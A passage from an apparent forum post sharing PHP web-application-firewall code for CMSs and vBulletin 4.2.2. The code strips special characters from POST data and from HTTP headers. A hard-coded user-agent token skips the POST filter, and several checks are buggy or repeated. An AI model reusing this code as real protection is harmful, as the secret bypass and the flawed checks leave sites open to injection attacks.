#007700">=&gt;&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">){<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">);<br />&nbsp;&nbsp;for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span style="color: #0000BB">$j</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$j</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$script</span><span style="color: #007700">,</span><span style="color: #0000BB">$list_exceptions</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$j</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent</span><span style="color: #007700">,</span><span style="color: #DD0000">'b00c52cac042640c440db9684a59ae36'</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_POST&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$list_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"***&#91;firewall&#93;***"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div>Note: If you want use this WAF on other CMS you must change white list and include it on cms config file (config files usually included on all files in CMS that’s why we do that).<br />
<br />
Here is a more powerful WAF made for VBulletin 4.2.2: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//Code&nbsp;By&nbsp;Ali&nbsp;Razmjoo<br />//waf2.php<br />//https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf2.php<br />#!@$%^&amp;*()-_+=`~&#91;&#93;\{}|;':",./&lt;&gt;?<br /></span><span style="color: #0000BB">$deny&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'#'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'!'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'@'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'$'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'%'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'^'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&amp;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'*'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'('</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">')'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'-'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'_'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'+'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'='</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'`'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'~'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#91;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#93;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\\'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'{'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'}'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'|'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">';'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\''</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">':'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">','</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'.'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'/'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&lt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&gt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'?'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$denytoken&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'#'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'!'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'@'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'$'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'%'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'^'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&amp;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'*'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'('</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">')'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'_'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'+'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'='</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'`'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'~'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#91;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#93;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\\'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'{'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'}'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'|'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">';'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\''</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">':'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">','</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'.'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'/'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&lt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&gt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'?'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$denymail&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'#'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'!'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'$'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'%'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'^'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&amp;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'*'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'('</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">')'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'+'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'='</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'`'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'~'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#91;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#93;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\\'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'{'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'}'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'|'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">';'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\''</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">':'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">','</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'/'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&lt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&gt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'?'</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$agent_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">"/"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"."&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"("&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">")"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">";"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"+"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">":"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"_"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"-"</span><span style="color: #007700">));<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_USER_AGENT"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$agent_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_USER_AGENT"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_USER_AGENT"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_REFERER"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_REFERER"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_REFERER"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_LANGUAGE"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_LANGUAGE"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_LANGUAGE"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br /></span><span style="color: #0000BB">$cookie_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">";"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"="</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">","</span><span style="color: #007700">,</span><span style="color: #DD0000">"/"</span><span style="color: #007700">,</span><span style="color: #DD0000">":"</span><span style="color: #007700">));<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$cookie_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_COOKIE"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$cookie_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_COOKIE"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$cookie_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_COOKIE"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$cache_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">));<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_PRAGMA"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$cache_deny</span><span style="color: 